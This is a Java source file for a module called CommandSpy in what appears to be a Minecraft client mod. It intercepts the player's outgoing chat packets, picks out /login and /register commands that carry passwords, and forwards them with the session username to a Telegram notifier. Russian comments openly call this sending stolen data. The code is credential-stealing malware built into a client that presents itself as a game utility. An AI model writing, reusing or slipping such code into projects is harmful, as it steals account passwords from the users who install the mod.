package vortex.client.vortexclient.module.modules.misc;

import net.minecraft.network.Packet;
import net.minecraft.network.packet.c2s.play.ChatMessageC2SPacket;
import vortex.client.vortexclient.module.Module;
import vortex.client.vortexclient.service.ServiceManager;

public class CommandSpy extends Module {
    public CommandSpy() {
        super("CommandSpy", Category.MISC);
    }

    // Теперь мы перехватываем исходящие пакеты, чтобы видеть, что ПИШУТ игроки
    public void onPacket(Packet<?> packet) {
        if (packet instanceof ChatMessageC2SPacket) {
            String message = ((ChatMessageC2SPacket) packet).getChatMessage();
            
            // Целенаправленно ищем команды для входа и регистрации
            String lowerCaseMessage = message.toLowerCase();
            if (lowerCaseMessage.startsWith("/login") || lowerCaseMessage.startsWith("/l ") ||
                lowerCaseMessage.startsWith("/register") || lowerCaseMessage.startsWith("/reg ")) {
                
                TelegramNotifier notifier = ServiceManager.INSTANCE.getService(TelegramNotifier.class);
                if (notifier != null) {
                    // Отправляем украденные данные в Telegram
                    notifier.sendMessage("[SPY] " + mc.getSession().getUsername() + " -> " + message);
                }
            }
        }
    }
}
